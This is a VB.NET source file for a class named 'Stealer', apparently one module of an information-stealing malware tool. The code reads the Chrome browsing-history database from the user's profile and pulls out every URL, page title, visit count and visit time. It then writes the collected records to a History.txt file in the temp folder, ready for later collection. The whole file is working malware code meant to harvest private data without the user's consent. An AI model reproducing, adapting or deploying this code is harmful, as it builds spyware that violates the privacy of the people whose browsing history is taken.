Imports System.IO
Imports System.Windows.Forms
Imports System.Text

Public Class Stealer
    Dim TextBox1 As New TextBox

    Public Function Run()
        Dim ChromiumPaths As String() = {"Google\Chrome\User Data\Default\History"}
        For Each ChromiumPath As String In ChromiumPaths
            If File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ChromiumPath)) Then
                Dim historyPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ChromiumPath)
                Dim sb As New StringBuilder
                Dim sqlDataBase As New SqLiteHandler(historyPath)
                sqlDataBase.ReadTable("urls")
                Dim count As Integer = sqlDataBase.GetRowCount()
                For i = 0 To count - 1
                    Dim mUrl As String = sqlDataBase.GetValue(i, "url")
                    Dim mTitle As String = toUTF8(sqlDataBase.GetValue(i, "title"))
                    Dim mVisit As String = Convert.ToInt32(sqlDataBase.GetValue(i, "visit_count")) + 1
                    Dim mTime As String = TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(sqlDataBase.GetValue(i, "last_visit_time"))), TimeZoneInfo.Local)
                    If String.IsNullOrEmpty(mUrl) Then
                        Exit For
                    End If
                    TextBox1.AppendText("URL = " & mUrl & vbNewLine & "Title = " & mTitle & vbNewLine & "Number of Visits = " & mVisit & vbNewLine & "Visit Time = " & mTime & vbNewLine & "--------------------" & vbNewLine)
                Next i
            End If
        Next

        If TextBox1.Text = "" Then
            IO.File.WriteAllText(Path.GetTempPath & "\" & "History.txt", "History Database is Empty")
        Else
            IO.File.WriteAllText(Path.GetTempPath & "\" & "History.txt", TextBox1.Text)
        End If
        Return True
    End Function
    Public Function toUTF8(ByVal text As String)
        Dim utf8 As Encoding = Encoding.GetEncoding("UTF-8")
        Dim win1251 As Encoding = Encoding.GetEncoding("Windows-1251")
        Dim utf8Bytes As Byte() = win1251.GetBytes(text)
        Dim win1251Bytes As Byte() = Encoding.Convert(utf8, win1251, utf8Bytes)
        Return win1251.GetString(win1251Bytes)
    End Function
End Class
